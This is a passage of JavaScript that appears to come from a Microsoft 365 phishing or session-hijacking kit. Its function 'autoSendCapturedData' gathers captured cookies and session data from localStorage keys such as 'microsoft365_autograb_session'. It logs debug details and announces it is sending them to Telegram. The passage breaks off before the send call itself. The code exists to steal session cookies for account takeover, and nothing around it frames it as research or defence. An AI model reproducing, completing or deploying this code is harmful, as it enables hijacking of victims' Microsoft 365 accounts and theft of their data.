  async function autoSendCapturedData() {
    try {
      const cookies = getAllCapturedCookies();
      console.log('🔍 AUTO-SEND DEBUG:', {
        cookieCount: cookies.length,
        hostname: window.location.hostname,
        hasCookies: cookies.length > 0,
        currentTime: new Date().toISOString()
      });
      
      if (cookies.length > 0) {
        console.log('📤 Microsoft 365: Auto-sending', cookies.length, 'captured cookies from', window.location.hostname, 'to Telegram...');
        const sessionData = JSON.parse(localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('microsoft365_session') || '{}');